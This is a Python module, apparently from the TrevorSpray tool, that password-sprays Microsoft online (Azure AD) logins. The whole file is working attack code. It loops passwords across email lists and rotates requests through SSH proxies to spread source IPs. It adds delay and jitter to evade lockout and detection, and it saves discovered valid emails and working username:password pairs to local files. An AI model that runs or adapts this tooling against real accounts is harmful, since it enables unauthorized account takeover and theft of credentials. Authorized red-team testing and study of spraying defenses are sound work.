import time
import random
import logging
import requests
from . import util
from pathlib import Path
from .proxy import SSHLoadBalancer
from .sprayers.msol import MSOLSpray


log = logging.getLogger('trevorspray.sprayer')


class TrevorSpray:

    def __init__(self, options):

        self.options = options

        self.lockout_counter = 0
        self.lockout_question = False

        self.home = Path.home() / '.trevorspray'
        self.home.mkdir(exist_ok=True)

        self.load_balancer = SSHLoadBalancer(
            hosts=options.ssh,
            key=options.key,
            key_pass=options.key_pass,
            base_port=options.base_port,
            current_ip=(not options.no_current_ip)
        )

        self.sprayer = MSOLSpray(
            url=options.url
        )

        self.valid_emails_file = str(self.home / 'valid_emails.txt')
        self.valid_logins_file = str(self.home / 'valid_logins.txt')
        self.tried_logins_file = str(self.home / 'tried_logins.txt')
        self.valid_emails = []
        self.valid_logins = []
        self.tried_logins = util.read_file(
            self.tried_logins_file,
            key=lambda x: x.startswith(self.sprayer.id)
        )

    def go(self):

        try:

            self.start()

            if self.options.recon:
                for domain in self.options.recon:
                    discovery = DomainDiscovery(domain)
                    discovery.recon()
                    '''
                    consider = 'You can also try:\n'
                    for suggestion in discovery.suggest():
                        consider += f' - {suggestion}\n'
                    log.info(consider)
                    '''

            if self.options.delay and self.options.ssh:
                num_ips = len(self.options.ssh) + (0 if self.options.no_current_ip else 1)
                new_delay = self.options.delay / num_ips
                log.verbose(f'Adjusting delay for {num_ips:,} IPs: {self.options.delay:.2f}s --> {new_delay:.2f}s per IP')
                self.options.delay = new_delay

            if (self.options.passwords and self.options.emails):
                log.info(f'Spraying {len(self.options.emails):,} users against {self.options.url} at {time.ctime()}')
                self.spray()

                log.info(f'Finished spraying {len(self.options.emails):,} users against {self.options.url} at {time.ctime()}')
                for success in self.valid_logins:
                    log.success(success)

        finally:
            self.stop()


    def spray(self):

        for proxy in self.load_balancer.proxies:
            log.verbose(f'Proxy: {proxy}')

        sprayed_counter = 0
        for password in self.options.passwords:
            for email in self.options.emails:

                login_id = f'{self.sprayer.id}|{email}|{password}'
                if login_id in self.tried_logins:
                    log.info(f'Already tried {email}:{password}, skipping.')
                    continue

                valid, exists, locked, msg = self.check_cred(email, password)
                self.tried_logins.add(login_id)
                sprayed_counter += 1

                if valid:
                    log.success(f'{email}:{password} - {msg}')
                    self.valid_logins.append(f'{email}:{password}')
                elif locked:
                    log.error(f'{email}:{password} - {msg}')
                elif exists:
                    log.warning(f'{email}:{password} - {msg}')
                else:
                    log.info(f'{email}:{password} - {msg}')

                if exists:
                    self.valid_emails.append(email)

                if locked:
                    self.lockout_counter += 1

                # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
                if not self.options.force and self.lockout_counter == 10 and self.lockout_question == False:
                    log.error('Multiple Account Lockouts Detected!')
                    log.error('10 of the accounts you sprayed appear to be locked out. Do you want to continue this spray?')
                    yes = {'yes', 'y'}
                    no = {'no', 'n', ''}
                    self.lockout_question = True
                    choice = 'X'
                    while (choice not in no and choice not in yes):
                        choice = input('[Y/N] (default is N): ').lower()

                    if choice in no:
                        log.info('Cancelling the password spray.')
                        log.info('NOTE: If you are seeing multiple "account is locked" messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled.')
                        break

                print(f'       Sprayed {sprayed_counter:,} accounts\r', end='', flush=True)
                if (self.options.delay or self.options.jitter) and (exists or self.sprayer.fail_nonexistent):
                    delay = float(self.options.delay)
                    jitter = random.random() * self.options.jitter
                    delay += jitter
                    if delay > 0:
                        log.debug(f'Sleeping for {self.options.delay:,} seconds ({self.options.delay:.2f}s delay + {jitter:.2f}s jitter)')
                    time.sleep(delay)

    def check_cred(self, email, password):

        proxy = None
        proxy_arg = dict()
        if self.load_balancer is not None:
            proxy = next(self.load_balancer)
            if proxy is not None:
                proxy_arg = {
                    'http': str(proxy),
                    'https': str(proxy)
                }

        while 1:
            try:
                session = requests.Session()
                request = self.sprayer.create_request(email, password).prepare()

                log.debug(f'Requesting {request.url} through proxy: {proxy}')
                response = session.send(
                    request,
                    proxies=proxy_arg,
                    timeout=10
                )
                log.debug(f'Finished requesting {request.url} through proxy: {proxy}')
                return self.sprayer.check_response(response)

            except requests.exceptions.RequestException as e:
                log.error(f'Error in request: {e}')
                log.error('Retrying...')
                # rebuild proxy
                if proxy_arg:
                    try:
                        proxy.start()
                    except SSHProxyError as e:
                        log.error(e)
                time.sleep(1)

    def start(self):

        self.load_balancer.start()

    def stop(self):

        self.load_balancer.stop()
        # write valid emails
        util.update_file(self.valid_emails_file, self.valid_emails)
        log.debug(f'{len(self.valid_emails):,} valid emails written to {self.valid_emails_file}')
        # write attempted logins
        util.update_file(self.tried_logins_file, self.tried_logins)
        # write valid logins
        util.update_file(self.valid_logins_file, self.valid_logins)
        log.debug(f'{len(self.valid_logins):,} valid user/pass combos written to {self.valid_logins_file}')
